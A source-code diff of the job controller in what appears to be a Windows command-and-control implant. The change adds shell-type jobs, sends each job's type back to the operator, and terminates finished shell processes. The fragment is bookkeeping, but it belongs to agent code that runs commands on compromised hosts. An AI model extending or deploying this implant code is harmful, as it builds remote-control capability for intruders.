@@ -1,13 +1,13 @@
 #include "JobsController.h"
 #include "ApiLoader.h"
 
-void* JobsController::operator new(size_t sz)
+void* JobsController::operator new(size_t sz) 
 {
 	void* p = MemAllocLocal(sz);
 	return p;
 }
 
-void JobsController::operator delete(void* p) noexcept
+void JobsController::operator delete(void* p) noexcept 
 {
 	MemFreeLocal(&p, sizeof(JobsController));
 }
@@ -27,11 +27,11 @@ void JobsController::ProcessJobs(Packer* packer)
 	for (int i = 0; i < this->jobs.size(); i++) {
 
         ULONG  available = 0;
-		LPVOID buffer = ReadDataFromAnonPipe(this->jobs[i].pipeRead, &available);
-
+		LPVOID buffer    = ReadDataFromAnonPipe(this->jobs[i].pipeRead, &available);
         if (available > 0) {
 			packer->Pack32(jobs[i].jobId);
 			packer->Pack32(COMMAND_JOB);
+			packer->Pack8(jobs[i].jobType);
 			packer->Pack8(JOB_STATE_RUNNING);
 			packer->PackBytes((BYTE*)buffer, available);
 			
@@ -41,19 +41,22 @@ void JobsController::ProcessJobs(Packer* packer)
 		if (jobs[i].jobState == JOB_STATE_RUNNING) {
 
             ULONG status = 0;
-			if (jobs[i].jobType == JOB_TYPE_PROCESS)
+			if (jobs[i].jobType == JOB_TYPE_PROCESS || jobs[i].jobType == JOB_TYPE_SHELL)
 				ApiWin->GetExitCodeProcess(jobs[i].jobObject, &status);
 			else if (jobs[i].jobType == JOB_TYPE_LOCAL || jobs[i].jobType == JOB_TYPE_REMOTE)
 				ApiWin->GetExitCodeThread(jobs[i].jobObject, &status);
 
 			if (status != STILL_ACTIVE) {
-				jobs[i].jobState = JOB_STATE_FINISHED;
+				if(jobs[i].jobType == JOB_TYPE_SHELL)
+					jobs[i].jobState = JOB_STATE_KILLED;
+				else
+					jobs[i].jobState = JOB_STATE_FINISHED;
 			}
 		}
 
 		if (jobs[i].jobState == JOB_STATE_KILLED || jobs[i].jobState == JOB_STATE_FINISHED) {
 
-			if (jobs[i].jobType == JOB_TYPE_PROCESS)
+			if (jobs[i].jobType == JOB_TYPE_PROCESS || jobs[i].jobType == JOB_TYPE_SHELL)
 				ApiNt->NtTerminateProcess(jobs[i].jobObject, NULL);
             else if (jobs[i].jobType == JOB_TYPE_LOCAL || jobs[i].jobType == JOB_TYPE_REMOTE)
 				ApiNt->NtTerminateThread(jobs[i].jobObject, NULL);
@@ -69,6 +72,7 @@ void JobsController::ProcessJobs(Packer* packer)
 
 			packer->Pack32(jobs[i].jobId);
 			packer->Pack32(COMMAND_JOB);
+			packer->Pack8(jobs[i].jobType);
 			packer->Pack8(jobs[i].jobState);
 
 			jobs.remove(i);
